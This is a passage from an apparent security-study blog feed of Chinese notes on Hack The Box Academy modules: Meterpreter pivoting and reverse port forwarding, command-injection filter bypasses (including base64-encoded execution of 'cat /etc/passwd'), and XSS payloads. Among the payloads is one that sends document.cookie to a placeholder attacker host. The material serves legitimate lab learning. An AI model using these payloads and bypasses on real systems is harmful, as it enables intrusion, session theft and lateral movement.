&gt; run autoroute -s 172.16.5.0/23</code></pre><p>添加必要的路由后，我们可以使用-p选项列出活动路由，以确保我们的配置按预期应用。</p><pre><code class="shell-session">meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Active Routing Table====================   Subnet             Netmask            Gateway   ------             -------            -------   10.129.0.0         255.255.0.0        Session 1   172.16.4.0         255.255.254.0      Session 1   172.16.5.0         255.255.254.0      Session 1</code></pre><p>从上面的输出中可以看出，该路由已添加到172.16.5.0&#x2F;23网络中。我们现在可以使用proxychans通过MeterMeter会话路由我们的Nmap流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</code></pre><h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><p>端口转发也可以使用Meterpeter的portfwd模块来完成。我们可以在我们的攻击主机上启用侦听器，并请求Meterpeter通过Metermeter会话将在该端口上接收到的所有数据包转发到172.16.5.0&#x2F;23网络上的远程主机。</p><pre><code class="shell-session">meterpreter &gt; help portfwdUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS:</code></pre><h4 id="Creating-Local-TCP-Relay"><a href="#Creating-Local-TCP-Relay" class="headerlink" title="Creating Local TCP Relay"></a>Creating Local TCP Relay</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19</code></pre><p>上述命令请求Metereter会话在我们的攻击主机的本地端口（-l）3300上启动一个侦听器，并通过我们的Meter会话将所有数据包转发到3389端口（-p）上的远程（-r）Windows服务器172.16.5.19。现在，如果我们在localhost:3300上执行xfreerdp，我们将能够创建一个远程桌面会话。</p><h4 id="Connecting-to-Windows-Target-through-localhost"><a href="#Connecting-to-Windows-Target-through-localhost" class="headerlink" title="Connecting to Windows Target through localhost"></a>Connecting to Windows Target through localhost</h4><pre><code class="shell-session">Tanin@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></pre><h4 id="Netstat-Output"><a href="#Netstat-Output" class="headerlink" title="Netstat Output"></a>Netstat Output</h4><p>我们可以使用Netstat来查看有关我们最近建立的会话的信息。从防御的角度来看，如果我们怀疑主机被破坏，我们可能会从使用Netstat中受益。这使我们能够查看主机建立的任何会话。</p><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antptcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp </code></pre><hr><h2 id="Meterpreter-Reverse-Port-Forwarding"><a href="#Meterpreter-Reverse-Port-Forwarding" class="headerlink" title="Meterpreter Reverse Port Forwarding"></a>Meterpreter Reverse Port Forwarding</h2><p>与本地端口转发类似，Metasploit也可以使用以下命令执行反向端口转发，您可能希望监听受损服务器上的特定端口，并将所有来自Ubuntu服务器的shell转发到我们的攻击主机。我们将在Windows攻击主机的新端口上启动一个侦听器，并请求Ubuntu服务器将在端口1234上接收到的所有请求转发到我们在端口8081上的侦听器。 我们可以使用下面的命令在前面的场景中的现有shell上创建反向端口转发。该命令将Ubuntu服务器上运行的1234端口上的所有连接转发到本地端口（-l）8081上的攻击主机。我们还将配置我们的侦听器，以便在Windows外壳的8081端口上侦听。</p><h4 id="Reverse-Port-Forwarding-Rules"><a href="#Reverse-Port-Forwarding-Rules" class="headerlink" title="Reverse Port Forwarding Rules"></a>Reverse Port Forwarding Rules</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234</code></pre><h4 id="Configuring-amp-Starting-multi-x2F-handler"><a href="#Configuring-amp-Starting-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting multi&#x2F;handler"></a>Configuring &amp; Starting multi&#x2F;handler</h4><pre><code class="shell-session">meterpreter &gt; bg[*] Backgrounding session 1...msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LPORT 8081 LPORT =&gt; 8081msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0 LHOST =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 0.0.0.0:8081 </code></pre><p>我们现在可以创建一个反向shell负载，当在Windows主机上执行时，该负载将在172.16.5.129:1234上将连接发送回我们的Ubuntu服务器。一旦我们的Ubuntu服务器接收到这个连接，它就会转发这个连接来攻击我们配置的主机的ip:8081。</p><h4 id="Establishing-the-Meterpreter-session"><a href="#Establishing-the-Meterpreter-session" class="headerlink" title="Establishing the Meterpreter session"></a>Establishing the Meterpreter session</h4><pre><code class="shell-session">[*] Started reverse TCP handler on 0.0.0.0:8081 [*] Sending stage (200262 bytes) to 10.10.14.18[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500meterpreter &gt; shellProcess 2336 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\&gt;</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Introduction-to-Pivoting-Tunneling-and-Port-Forwarding&quot;&gt;&lt;a href=&quot;#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding&quot; class=&quot;headerlink&quot; title=&quot;Introduction to Pivoting, Tunneling, and Port Forwarding&quot;&gt;&lt;/a&gt;Introduction to Pivoting, Tunneling, and Port Forwarding&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>command injections</title>
    <link href="https://taninluv.github.io/2023/08/24/command-injections/"/>
    <id>https://taninluv.github.io/2023/08/24/command-injections/</id>
    <published>2023-08-24T09:53:07.000Z</published>
    <updated>2023-08-27T08:11:45.391Z</updated>
    
    <content type="html"><![CDATA[<p>检测基本操作系统命令注入漏洞的过程与利用此类漏洞的过程相同。我们试图通过各种注入方法附加我们的命令。如果命令输出与预期的通常结果不同，则我们已成功利用该漏洞。对于更高级的命令注入漏洞，情况可能并非如此，因为我们可能会利用各种模糊方法或代码审查来识别潜在的命令注入弱点。然后，我们可以逐步构建我们的有效载荷，直到我们实现命令注入。</p><span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Filtered-Character-Bypass"><a href="#Filtered-Character-Bypass" class="headerlink" title="Filtered Character Bypass"></a>Filtered Character Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><code>printenv</code></td><td>Can be used to view all environment variables</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>$&#123;IFS&#125;</code></td><td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td></tr><tr><td><code>&#123;ls,-la&#125;</code></td><td>Commas will be replaced with spaces</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>$&#123;PATH:0:1&#125;</code></td><td>Will be replaced with <code>/</code></td></tr><tr><td><code>$&#123;LS_COLORS:10:1&#125;</code></td><td>Will be replaced with <code>;</code></td></tr><tr><td><code>$(tr &#39;!-&#125;&#39; &#39;&quot;-~&#39;&lt;&lt;&lt;[)</code></td><td>Shift character by one (<code>[</code> -&gt; <code>\</code>)</td></tr></tbody></table><hr><h2 id="Blacklisted-Command-Bypass"><a href="#Blacklisted-Command-Bypass" class="headerlink" title="Blacklisted Command Bypass"></a>Blacklisted Command Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>&#39;</code> or <code>&quot;</code></td><td>Total must be even</td></tr><tr><td><code>$@</code> or <code>\</code></td><td>Linux only</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)</code></td><td>Execute command regardless of cases</td></tr><tr><td><code>$(a=&quot;WhOaMi&quot;;printf %s &quot;$&#123;a,,&#125;&quot;)</code></td><td>Another variation of the technique</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td>&#96;echo ‘whoami’</td><td>rev&#96;</td></tr><tr><td><code>$(rev&lt;&lt;&lt;&#39;imaohw&#39;)</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td>&#96;echo -n ‘cat &#x2F;etc&#x2F;passwd</td><td>grep 33’</td></tr><tr><td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td><td>Execute b64 encoded string</td></tr></tbody></table><hr><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="Filtered-Character-Bypass-1"><a href="#Filtered-Character-Bypass-1" class="headerlink" title="Filtered Character Bypass"></a>Filtered Character Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-ChildItem Env:</code></td><td>Can be used to view all environment variables - (PowerShell)</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>%PROGRAMFILES:~10,-5%</code></td><td>Will be replaced with a space - (CMD)</td></tr><tr><td><code>$env:PROGRAMFILES[10]</code></td><td>Will be replaced with a space - (PowerShell)</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>%HOMEPATH:~0,-17%</code></td><td>Will be replaced with <code>\</code> - (CMD)</td></tr><tr><td><code>$env:HOMEPATH[0]</code></td><td>Will be replaced with <code>\</code> - (PowerShell)</td></tr></tbody></table><hr><h2 id="Blacklisted-Command-Bypass-1"><a href="#Blacklisted-Command-Bypass-1" class="headerlink" title="Blacklisted Command Bypass"></a>Blacklisted Command Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>&#39;</code> or <code>&quot;</code></td><td>Total must be even</td></tr><tr><td><code>^</code></td><td>Windows only (CMD)</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>WhoAmi</code></td><td>Simply send the character with odd cases</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td><code>&quot;whoami&quot;[-1..-20] -join &#39;&#39;</code></td><td>Reverse a string</td></tr><tr><td><code>iex &quot;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&quot;</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))</code></td><td>Encode a string with base64</td></tr><tr><td><code>iex &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))&quot;</code></td><td>Execute b64 encoded string</td></tr></tbody></table><h2 id="Command-Injection-Methods"><a href="#Command-Injection-Methods" class="headerlink" title="Command Injection Methods"></a>Command Injection Methods</h2><p>要将附加命令注入到预期命令中，我们可以使用以下任何运算符：</p><table><thead><tr><th><strong>Injection Operator</strong></th><th><strong>Injection Character</strong></th><th><strong>URL-Encoded Character</strong></th><th><strong>Executed Command</strong></th></tr></thead><tbody><tr><td>Semicolon</td><td><code>;</code></td><td><code>%3b</code></td><td>Both</td></tr><tr><td>New Line</td><td><code>\n</code></td><td><code>%0a</code></td><td>Both</td></tr><tr><td>Background</td><td><code>&amp;</code></td><td><code>%26</code></td><td>Both (second output generally shown first)</td></tr><tr><td>Pipe</td><td>&#96;</td><td>&#96;</td><td><code>%7c</code></td></tr><tr><td>AND</td><td><code>&amp;&amp;</code></td><td><code>%26%26</code></td><td>Both (only if first succeeds)</td></tr><tr><td>OR</td><td>&#96;</td><td></td><td>&#96;</td></tr><tr><td>Sub-Shell</td><td>&#96;&#96;&#96;&#96;</td><td><code>%60%60</code></td><td>Both (Linux-only)</td></tr><tr><td>Sub-Shell</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>Both (Linux-only)</td></tr></tbody></table><p>注意：唯一的例外可能是分号；，如果使用Windows命令行（CMD）执行命令，则该命令将不起作用，但如果使用Windows PowerShell执行命令，该命令仍将起作用。</p><table><thead><tr><th><strong>Injection Type</strong></th><th><strong>Operators</strong></th></tr></thead><tbody><tr><td>SQL Injection</td><td><code>&#39;</code> <code>,</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Command Injection</td><td><code>;</code> <code>&amp;&amp;</code></td></tr><tr><td>LDAP Injection</td><td><code>*</code> <code>(</code> <code>)</code> <code>&amp;</code> &#96;</td></tr><tr><td>XPath Injection</td><td><code>&#39;</code> <code>or</code> <code>and</code> <code>not</code> <code>substring</code> <code>concat</code> <code>count</code></td></tr><tr><td>OS Command Injection</td><td><code>;</code> <code>&amp;</code> &#96;</td></tr><tr><td>Code Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code> <code>$()</code> <code>$&#123;&#125;</code> <code>#&#123;&#125;</code> <code>%&#123;&#125;</code> <code>^</code></td></tr><tr><td>Directory Traversal&#x2F;File Path Traversal</td><td><code>../</code> <code>..\\</code> <code>%00</code></td></tr><tr><td>Object Injection</td><td><code>;</code> <code>&amp;</code> &#96;</td></tr><tr><td>XQuery Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Shellcode Injection</td><td><code>\x</code> <code>\u</code> <code>%u</code> <code>%n</code></td></tr><tr><td>Header Injection</td><td><code>\n</code> <code>\r\n</code> <code>\t</code> <code>%0d</code> <code>%0a</code> <code>%09</code></td></tr></tbody></table><h2 id="Blacklisted-Characters"><a href="#Blacklisted-Characters" class="headerlink" title="Blacklisted Characters"></a>Blacklisted Characters</h2><p>web应用程序可能有一个列入黑名单的字符列表，如果命令中包含这些字符，它将拒绝请求。PHP代码可能如下所示：</p><pre><code class="php">$blacklist = [&#39;&amp;&#39;, &#39;|&#39;, &#39;;&#39;, ...SNIP...];foreach ($blacklist as $character) &#123;    if (strpos($_POST[&#39;ip&#39;], $character) !== false) &#123;        echo &quot;Invalid input&quot;;    &#125;&#125;</code></pre><h2 id="Identifying-Blacklisted-Character"><a href="#Identifying-Blacklisted-Character" class="headerlink" title="Identifying Blacklisted Character"></a>Identifying Blacklisted Character</h2><p>我们将请求减少到一次一个字符，看看它何时被阻止。</p><h2 id="Bypass-Blacklisted-Spaces"><a href="#Bypass-Blacklisted-Spaces" class="headerlink" title="Bypass Blacklisted Spaces"></a>Bypass Blacklisted Spaces</h2><p>我们会看到，大多数注射经营者确实被列入黑名单。但是，换行符通常不会被列入黑名单，因为有效负载本身可能需要它。我们知道，在Linux和Windows中，换行符都可以用于附加命令，所以让我们尝试将其用作注入运算符：</p><h4 id="Using-Tabs"><a href="#Using-Tabs" class="headerlink" title="Using Tabs"></a>Using Tabs</h4><p>使用制表符（%09）而不是空格是一种可行的技术，因为Linux和Windows都接受参数之间带有制表符的命令，并且它们的执行方式相同</p><ul><li><code>%0a</code>：这表示 ASCII 值为 10 的字符，它是换行符（Line Feed，LF）的 ASCII 值。</li><li><code>%09</code>：这表示 ASCII 值为 9 的字符，它是水平制表符（Tab）的 ASCII 值。</li></ul><h4 id="Using-IFS"><a href="#Using-IFS" class="headerlink" title="Using $IFS"></a>Using $IFS</h4><p>使用（$IFS）Linux环境变量也可以工作，因为它的默认值是一个空格和一个选项卡，可以在命令参数之间工作。因此，如果我们在空格所在的位置使用${IFS}，则变量应自动替换为空格，并且我们的命令应该有效。</p><blockquote><p><code>$IFS</code> 是一个环境变量，在 Unix 和类 Unix 操作系统中使用。它代表 “Internal Field Separator”（内部字段分隔符），用于定义用于分隔字符的字符串。</p></blockquote><h4 id="Using-Brace-Expansion"><a href="#Using-Brace-Expansion" class="headerlink" title="Using Brace Expansion"></a>Using Brace Expansion</h4><p>还有许多其他方法可以用来绕过空间过滤器。例如，我们可以使用Bash-Brace Expansion功能，该功能会自动在大括号之间的参数之间添加空格，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ &#123;ls,-la&#125;</code></pre><h1 id="Bypassing-Other-Blacklisted-Characters"><a href="#Bypassing-Other-Blacklisted-Characters" class="headerlink" title="Bypassing Other Blacklisted Characters"></a>Bypassing Other Blacklisted Characters</h1><p>除了注入运算符和空格字符外，一个非常常见的黑名单字符是斜杠（&#x2F;）或反斜杠（\）字符，因为在Linux或Windows中指定目录是必要的。我们可以使用多种技术来生成我们想要的任何字符，同时避免使用列入黑名单的字符。</p><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>我们可以利用许多技术在有效载荷中设置斜线。我们可以用来替换斜杠（或任何其他字符）的一种技术是通过&#x3D;&#x3D;Linux环境变量&#x3D;&#x3D;，就像我们对${IFS}所做的那样。虽然${IFS}被直接替换为空格，但斜杠或分号没有这样的环境变量。然而，这些字符可以在环境变量中使用，并且我们可以指定字符串的开始和长度来完全匹配这个字符。 例如，如果我们查看Linux中的$PATH环境变量，它可能如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $&#123;PATH&#125;/usr/local/bin:/usr/bin:/bin:/usr/games</code></pre><p>因此，如果我们从0字符开始，并且只使用长度为1的字符串，那么我们将只使用&#x2F;字符，我们可以在有效载荷中使用：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $&#123;PATH:0:1&#125;/</code></pre><blockquote><p>参数扩展语法是 Shell 编程中一种用于操作和处理变量值的特殊语法。它允许你从变量值中提取子字符串、执行替换操作、计算长度等等。参数扩展可以用于在脚本中处理字符串、变量和命令的输出。</p><p>在大多数 Unix-like Shell（如 Bash、Zsh、sh 等）中，有几种常用的参数扩展形式：</p><ol><li><code>$&#123;variable&#125;</code>：用于引用变量的值。例如，<code>$&#123;PATH&#125;</code> 表示引用 <code>PATH</code> 变量的值。</li><li><code>$&#123;variable:-default&#125;</code>：如果变量未定义或为空，则使用默认值。例如，<code>$&#123;USERNAME:-guest&#125;</code> 表示如果 <code>USERNAME</code> 变量未定义或为空，使用默认值 “guest”。</li><li><code>$&#123;variable:=default&#125;</code>：如果变量未定义或为空，则将其设置为默认值。例如，<code>$&#123;EDITOR:=nano&#125;</code> 表示如果 <code>EDITOR</code> 变量未定义或为空，设置为 “nano”。</li><li><code>$&#123;variable:offset:length&#125;</code>：从变量值中提取子字符串。例如，<code>$&#123;NAME:0:3&#125;</code> 表示从 <code>NAME</code> 变量的值中提取前三个字符。</li><li><code>$&#123;variable#pattern&#125;</code> 和 <code>$&#123;variable##pattern&#125;</code>：从变量值的开头移除匹配的模式。<code>#</code> 会移除最短匹配，<code>##</code> 会移除最长匹配。</li><li><code>$&#123;variable%pattern&#125;</code> 和 <code>$&#123;variable%%pattern&#125;</code>：从变量值的末尾移除匹配的模式。<code>%</code> 会移除最短匹配，<code>%%</code> 会移除最长匹配。</li><li>&#96;$</li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;检测基本操作系统命令注入漏洞的过程与利用此类漏洞的过程相同。我们试图通过各种注入方法附加我们的命令。如果命令输出与预期的通常结果不同，则我们已成功利用该漏洞。对于更高级的命令注入漏洞，情况可能并非如此，因为我们可能会利用各种模糊方法或代码审查来识别潜在的命令注入弱点。然后，我们可以逐步构建我们的有效载荷，直到我们实现命令注入。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://taninluv.github.io/2023/08/15/XSS/"/>
    <id>https://taninluv.github.io/2023/08/15/XSS/</id>
    <published>2023-08-15T08:05:13.000Z</published>
    <updated>2023-08-18T10:37:21.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS-Testing-Payloads"><a href="#XSS-Testing-Payloads" class="headerlink" title="XSS Testing Payloads"></a>XSS Testing Payloads</h2><p>我们可以通过以下基本XSS负载来测试页面是否易受XSS攻击：</p><pre><code class="html">&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></pre><span id="more"></span><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>XSS Payloads</strong></td><td></td></tr><tr><td><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;plaintext&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;script&gt;print()&lt;/script&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;</code></td><td>HTML-based XSS Payload</td></tr><tr><td><code>&lt;script&gt;document.body.style.background = &quot;#141d2b&quot;&lt;/script&gt;</code></td><td>Change Background Color</td></tr><tr><td><code>&lt;script&gt;document.body.background = &quot;https://www.hackthebox.eu/images/logo-htb.svg&quot;&lt;/script&gt;</code></td><td>Change Background Image</td></tr><tr><td><code>&lt;script&gt;document.title = &#39;HackTheBox Academy&#39;&lt;/script&gt;</code></td><td>Change Website Title</td></tr><tr><td><code>&lt;script&gt;document.getElementsByTagName(&#39;body&#39;)[0].innerHTML = &#39;text&#39;&lt;/script&gt;</code></td><td>Overwrite website’s main body</td></tr><tr><td><code>&lt;script&gt;document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;</code></td><td>Remove certain HTML element</td></tr><tr><td><code>&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;</code></td><td>Load remote script</td></tr><tr><td><code>&lt;script&gt;new Image().src=&#39;http://OUR_IP/index.php?c=&#39;+document.cookie&lt;/script&gt;</code></td><td>Send Cookie details to us</td></tr><tr><td><strong>Commands</strong></td><td></td></tr><tr><td><code>python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;</code></td><td>Run <code>xsstrike</code> on a url parameter</td></tr><tr><td><code>sudo nc -lvnp 80</code></td><td>Start <code>netcat</code> listener</td></tr><tr><td><code>sudo php -S 0.0.0.0:80</code></td><td>Start <code>PHP</code> server</td></tr></tbody></table><blockquote><p>提示：许多现代web应用程序使用跨域IFrame来处理用户输入，因此即使web表单易受XSS攻击，它也不会成为主web应用程序上的漏洞。这就是为什么我们在警告框中显示window.origin的值，而不是像1这样的静态值。在这种情况下，警报框会显示它正在执行的URL，并确认哪个表单是易受攻击的表单，以防使用IFrame。</p></blockquote><p>由于一些现代浏览器可能会在特定位置阻止<code>alert（）</code>JavaScript函数，因此了解一些其他基本的XSS有效载荷来验证XSS的存在可能会很方便。一个这样的XSS有效载荷是＜明文＞，它将停止呈现后面的HTML代码，并将其显示为明文。另一个容易发现的负载是<code>&lt;script&gt;print（）&lt;/script&gt;</code>，它将弹出浏览器打印对话框，任何浏览器都不太可能阻止它。试着使用这些有效载荷来看看每个有效载荷是如何工作的。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.</p><p><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></p><p>输入测试注入后发现可以触发XSS漏洞：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151618784.png" alt="image-20230815161839658"></p><p>然如注入</p><p><code>&lt;script&gt;alert( document.cookie)&lt;/script&gt;</code></p><p>从DOM读取cookie并反弹即可</p><h1 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h1><p>有两种类型的非持久性XSS漏洞：反射XSS，由后端服务器处理；基于DOM的XSS，完全在客户端处理，永远不会到达后端服务器。与持久XSS不同，非持久XSS漏洞是暂时的，通过页面刷新不会持久存在。因此，我们的攻击只影响目标用户，不会影响访问该页面的其他用户。 当我们的输入到达后端服务器并在未经过滤或净化的情况下返回给我们时，就会出现反映的XSS漏洞。在许多情况下，我们的整个输入可能会返回给我们，比如错误消息或确认消息。在这些情况下，我们可能会尝试使用XSS有效载荷来查看它们是否执行。然而，由于这些通常是临时消息，一旦我们离开页面，它们就不会再次执行，因此它们是非持久性的。</p><p>正如我们所看到的，单引号确实包含我们的XSS负载“＜script＞alert（window.origin）&lt;&#x2F;script＞”。 如果我们再次访问Reflected页面，错误消息将不再出现，并且我们的XSS负载也不会执行，这意味着这个XSS漏洞确实是非持久性的。 但是，如果XSS漏洞是非持久性的，我们将如何用它来瞄准受害者？ 这取决于使用哪个HTTP请求将我们的输入发送到服务器。我们可以通过Firefox开发工具点击[CTRL+I]并选择“网络”选项卡来检查这一点。然后，我们可以再次放入测试负载，并点击“添加”发送它</p><p>正如我们所看到的，第一行显示我们的请求是一个GET请求。GET请求将它们的参数和数据作为URL的一部分发送。因此，为了针对用户，我们可以向他们发送一个包含我们的有效负载的URL。要获取URL，我们可以在发送XSS负载后从Firefox的URL栏中复制URL，也可以右键单击“网络”选项卡中的get请求，然后选择“复制”&gt;“复制URL”。一旦受害者访问此URL，XSS负载将执行</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p>这里发送payload后在浏览器中找到了该请求，然后可以复制其url发送给其他用户触发XSS，curl也是可以的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151635364.png" alt="image-20230815163500315"></p><h1 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h1><pre><code class="javascript">document.getElementById(&quot;todo&quot;).innerHTML = &quot;&lt;b&gt;Next Task:&lt;/b&gt; &quot; + decodeURIComponent(task);</code></pre><p>我们可以看到，我们可以控制输入，而输出没有被净化，所以这个页面应该容易受到DOM XSS的攻击。</p><h2 id="DOM-Attacks"><a href="#DOM-Attacks" class="headerlink" title="DOM Attacks"></a>DOM Attacks</h2><p>如果我们尝试以前使用过的XSS负载，我们会发现它不会执行。这是因为innerHTML函数不允许将其中的＜script＞标记用作安全功能。尽管如此，我们使用的许多其他XSS有效载荷都不包含＜script＞标签，比如下面的XSS有效负载：</p><pre><code class="html">&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;</code></pre><h1 id="XSS-Discovery"><a href="#XSS-Discovery" class="headerlink" title="XSS Discovery"></a>XSS Discovery</h1><h2 id="Automated-Discovery"><a href="#Automated-Discovery" class="headerlink" title="Automated Discovery"></a>Automated Discovery</h2><p>几乎所有的Web应用程序漏洞扫描程序（如Nessus、Burp Pro或ZAP）都具有检测所有三种类型的XSS漏洞的各种功能。这些扫描仪通常进行两种类型的扫描：被动扫描，用于检查客户端代码中是否存在潜在的基于DOM的漏洞；主动扫描，用于发送各种类型的有效载荷，试图通过在页面源中注入有效载荷来触发XSS。</p><p>虽然付费工具在检测XSS漏洞方面通常具有更高的准确性（尤其是在需要安全绕过的情况下），但我们仍然可以找到开源工具来帮助我们识别潜在的XSS漏洞。这些工具通常通过识别网页中的输入字段，发送各种类型的XSS有效载荷，然后比较渲染的页面源，看看是否可以在其中找到相同的有效载荷，这可能表明XSS注入成功。尽管如此，这并不总是准确的，因为有时，即使注入了相同的有效载荷，由于各种原因，也可能无法成功执行，因此我们必须始终手动验证XSS注入。</p><p>可以帮助我们发现XSS的一些常见开源工具是<a href="https://github.com/s0md3v/XSStrike">XSS Strike</a>、<a href="https://github.com/rajeshmajumdar/BruteXSS">Brute XSS</a>和 <a href="https://github.com/epsylon/xsser">XSSer</a>。我们可以通过gitclone将XSS Strike克隆到我们的VM来尝试：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.gitTanin@htb[/htb]$ cd XSStrikeTanin@htb[/htb]$ pip install -r requirements.txtTanin@htb[/htb]$ python xsstrike.py</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;         XSStrike v3.1.4[~] Checking for DOM vulnerabilities [+] WAF Status: Offline [!] Testing parameter: task [!] Reflections found: 1 [~] Analysing reflections [~] Generating payloads [!] Payloads generated: 3072 ------------------------------------------------------------[+] Payload: &lt;HtMl%09onPoIntERENTER+=+confirm()&gt; [!] Efficiency: 100 [!] Confidence: 10 [?] Would you like to continue scanning? [y/N]</code></pre><h2 id="Manual-Discovery"><a href="#Manual-Discovery" class="headerlink" title="Manual Discovery"></a>Manual Discovery</h2><p>当涉及到手动XSS发现时，发现XSS漏洞的难度取决于web应用程序的安全级别。基本XSS漏洞通常可以通过测试各种XSS有效载荷来发现，但识别高级XSS漏洞需要高级代码审查技能。</p><h4 id="XSS-Payloads"><a href="#XSS-Payloads" class="headerlink" title="XSS Payloads"></a>XSS 